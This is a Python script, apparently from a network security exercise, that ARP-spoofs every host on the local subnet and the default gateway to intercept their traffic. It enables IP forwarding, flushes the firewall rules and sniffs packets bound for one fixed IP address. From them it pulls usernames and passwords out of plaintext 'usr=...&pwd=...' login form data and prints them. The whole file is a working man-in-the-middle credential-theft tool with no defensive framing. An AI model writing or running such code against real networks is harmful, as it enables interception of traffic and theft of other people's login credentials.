#!/usr/bin/env python3

import netifaces
import ipaddress
from scapy.all import *
import time
from multiprocessing import Process
import sys
import re
import subprocess

with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
    f.write("1")

ret = subprocess.call(["iptables", "-F"])
assert ret == 0

dgateway = netifaces.gateways()["default"]
gateway_ip, iface = dgateway[netifaces.AF_INET]

my_mac = next(
    filter(lambda x: "addr" in x,
           netifaces.ifaddresses(iface)[netifaces.AF_LINK]))["addr"]

inet = next(
    filter(lambda x: "netmask" in x,
           netifaces.ifaddresses(iface)[netifaces.AF_INET]))
my_ip = inet["addr"]
network = ipaddress.IPv4Network((inet["addr"], inet["netmask"]), strict=False)

arp = ARP(pdst=str(network))
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
packet = ether / arp
result, _ = srp(packet, timeout=3)

clients = []
for sent, received in result:
    if received.psrc == gateway_ip:
        gateway_mac = received.hwsrc
        continue
    clients.append({"ip": received.psrc, "mac": received.hwsrc})

print("")
print("Available devices")
print("IP" + " " * 18 + "MAC")
for client in clients:
    print("{:16}    {}".format(client["ip"], client["mac"]))
print("")


def send_arps():
    while True:
        print("Sending ARP packets...", file=sys.stderr)
        for client in clients:
            packet = ARP(
                op=2,
                pdst=client["ip"],
                hwdst=client["mac"],
                psrc=gateway_ip,
            )
            send(packet, verbose=False)
            packet = ARP(
                op=2,
                pdst=gateway_ip,
                hwdst=gateway_mac,
                psrc=client["ip"],
            )
            send(packet, verbose=False)
        time.sleep(10)


p = Process(target=send_arps)
p.start()


def handle_packet(packet):
    search_result = re.search(r"usr=(.*)\&pwd=(.*)\&",
                              packet.sprintf("{Raw:%Raw.load%}"))
    if search_result:
        print("Username: ", search_result.group(1))
        print("Password: ", search_result.group(2))


sniff(prn=handle_packet,
      filter="ip dst 140.113.207.246 and not ether src {}".format(my_mac),
      store=0,
      iface=iface)
